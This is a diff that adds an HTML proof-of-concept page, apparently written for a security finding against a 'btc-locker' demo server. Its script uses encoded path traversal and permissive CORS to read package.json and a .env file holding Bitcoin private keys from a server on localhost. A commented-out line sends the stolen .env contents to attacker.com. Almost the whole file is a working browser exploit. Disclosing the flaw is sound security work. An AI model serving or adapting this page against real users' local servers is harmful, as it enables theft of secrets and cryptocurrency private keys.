@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<!-- CRITICAL-3 BROWSER PoC
+     Serve from ANY origin (e.g. evil.com).
+     When a user visits this page while btc-locker demo server is running
+     on localhost:3000, their Bitcoin-related server files are silently exfiltrated.
+-->
+<html>
+<head><title>CRITICAL-3 PoC</title></head>
+<script>
+(async () => {
+  const SERVER = "http://localhost:3000";
+
+  // 1. Read packages/demo/package.json (confirmed to exist)
+  const r1 = await fetch(SERVER + "/examples/..%2F..%2Fpackage.json");
+  const pkg = await r1.json();
+  console.log("[!] package.json STOLEN:", pkg);
+
+  // 2. Read .env (if present — contains private keys in production deployments)
+  const r2 = await fetch(SERVER + "/examples/..%2F..%2F..%2F..%2F.env");
+  if (r2.ok) {
+    const env = await r2.text();
+    console.log("[!] .env STOLEN — Bitcoin private keys exposed:", env);
+    // Exfiltrate to attacker server:
+    // await fetch("https://attacker.com/collect?data=" + encodeURIComponent(env));
+  }
+
+  document.body.innerHTML =
+    "<h2>CRITICAL-3: Arbitrary file read via path traversal + CORS</h2>" +
+    "<pre>" + JSON.stringify(pkg, null, 2) + "</pre>";
+})();
+</script>
+<body>Loading...</body>
+</html>
